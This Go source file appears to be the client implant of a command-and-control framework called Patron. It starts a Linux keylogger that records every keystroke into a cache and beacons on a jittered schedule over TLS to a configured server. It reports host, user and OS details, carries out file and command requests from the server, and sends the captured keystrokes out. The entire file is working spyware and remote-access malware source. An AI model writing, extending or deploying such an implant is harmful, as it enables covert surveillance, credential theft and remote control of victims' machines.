package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"strings"
	"time"

	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
	"github.com/PatronC2/Patron/client/client_utils"
	"github.com/PatronC2/Patron/lib/common"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/linux-keylogger-1/keylogger"
)

var (
	ServerIP          string
	ServerPort        string
	CallbackFrequency string
	CallbackJitter    string
	RootCert          string
	LoggingEnabled    string
	cache             string
)

func main() {
	client_utils.Initialize(LoggingEnabled)
	config, err := client_utils.LoadCertificate(RootCert)
	if err != nil {
		log.Fatalf("Failed to load certificate: %v\n", err)
	}

	keyboard := keylogger.FindKeyboardDevice()
	k, err := keylogger.New(keyboard)
	if err != nil {
		logger.Logf(logger.Error, "Error starting keylogger: %v", err)
		return
	}
	logger.Logf(logger.Debug, "Started keylogger")
	defer k.Close()

	events := k.Read()

	shiftActive := false
	capsLockActive := false

	// Shift mapping for special characters
	shiftMappings := map[string]string{
		"1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
		"6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
		"-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
		";": ":", "'": "\"", ",": "<", ".": ">", "/": "?",
		"`": "~",
	}

	go func() {
		for e := range events {
			switch e.Type {
			case keylogger.EvKey:
				keyStr := e.KeyString()
				if keyStr == "L_SHIFT" || keyStr == "R_SHIFT" {
					shiftActive = e.KeyPress()
					continue
				}
				if keyStr == "CAPS_LOCK" && e.KeyPress() {
					capsLockActive = !capsLockActive
					continue
				}
				if e.KeyPress() {
					switch keyStr {
					case "SPACE":
						cache += " "
					case "ENTER":
						cache += "\n"
					case "TAB":
						cache += "\t"
					case "BS", "BACKSPACE":
						if len(cache) > 0 {
							cache = cache[:len(cache)-1]
						}
					default:
						if shiftActive && shiftMappings[keyStr] != "" {
							keyStr = shiftMappings[keyStr]
						} else if len(keyStr) == 1 && keyStr >= "a" && keyStr <= "z" {
							if (shiftActive && !capsLockActive) || (!shiftActive && capsLockActive) {
								keyStr = strings.ToUpper(keyStr)
							} else {
								keyStr = strings.ToLower(keyStr)
							}
						} else if len(keyStr) == 1 && keyStr >= "A" && keyStr <= "Z" {
							if !capsLockActive && !shiftActive {
								keyStr = strings.ToLower(keyStr)
							}
						}

						cache += keyStr
					}
				}
			}
		}
	}()

	agentID, hostname, username := client_utils.GenerateAgentMetadata()
	logger.Logf(logger.Info, "Created AgentID: %v. Hostname: %v. Username: %v", agentID, hostname, username)
	osType, osArch, osVersion, cpus, memory := client_utils.GetOSInfo()

	for {
		beacon, err := client_utils.EstablishConnection(config, ServerIP, ServerPort)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Beacon connected")

		ip := client_utils.GetLocalIP(beacon)
		nextCallback := client_utils.CalculateNextCallbackTime(CallbackFrequency, CallbackJitter)
		err = client_utils.HandleConfigurationRequest(
			beacon, agentID, hostname, username, ip,
			osType, osArch, osVersion, cpus, memory,
			ServerIP, ServerPort, CallbackFrequency, CallbackJitter,
			nextCallback,
		)
		if err != nil {
			client_utils.HandleError(beacon, "configuration", err)
			continue
		}
		if err := client_utils.HandleFileRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "file", err)
			continue
		}

		if err := client_utils.HandleCommandRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "command", err)
			continue
		}

		if err := handleKeysRequest(beacon, agentID); err != nil {
			client_utils.HandleError(beacon, "keylogs", err)
			continue
		}

		beacon.Close()
		logger.Logf(logger.Info, "Beacon successful")
		sleepDuration := time.Until(nextCallback)

		if sleepDuration > 0 {
			logger.Logf(logger.Info, "Sleeping until next callback: %v (in %.2fs)", nextCallback.Format(time.RFC3339), sleepDuration.Seconds())
			time.Sleep(sleepDuration)
		} else {
			logger.Logf(logger.Warning, "Next callback time already passed (%.2fs ago). Skipping sleep.", -sleepDuration.Seconds())
		}
	}
}

func handleKeysRequest(conn *tls.Conn, agentID string) error {
	logger.Logf(logger.Info, "Sending keylogs: %v", cache)

	req := &patronobuf.Request{
		Type: patronobuf.RequestType_KEYS,
		Payload: &patronobuf.Request_Keys{
			Keys: &patronobuf.KeysRequest{
				Uuid: agentID,
				Keys: cache,
			},
		},
	}

	if err := common.WriteDelimited(conn, req); err != nil {
		return fmt.Errorf("failed to send keys request: %w", err)
	}

	resp := &patronobuf.Response{}
	if err := common.ReadDelimited(conn, resp); err != nil {
		return fmt.Errorf("failed to read keys response: %w", err)
	}

	cache = ""
	return nil
}
